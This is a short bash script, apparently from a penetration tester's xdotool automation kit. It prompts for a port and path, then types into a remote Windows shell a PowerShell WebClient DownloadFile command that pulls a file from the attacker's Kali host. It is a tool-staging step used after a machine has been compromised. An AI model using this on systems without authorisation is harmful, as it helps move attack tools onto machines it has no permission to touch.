#!/bin/bash

: '
PowerShell: Save file and save in current remote folder.
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "Port" "Path"

PORT=${form_data["Port"]}
B_PATH=${form_data["Path"]}
F_NAME=$(basename $B_PATH)

paste_command "powershell \"(New-Object System.Net.WebClient).DownloadFile('http://${KALI_IP}:${PORT}/${B_PATH}', '${F_NAME}')\""
xdotool key Return
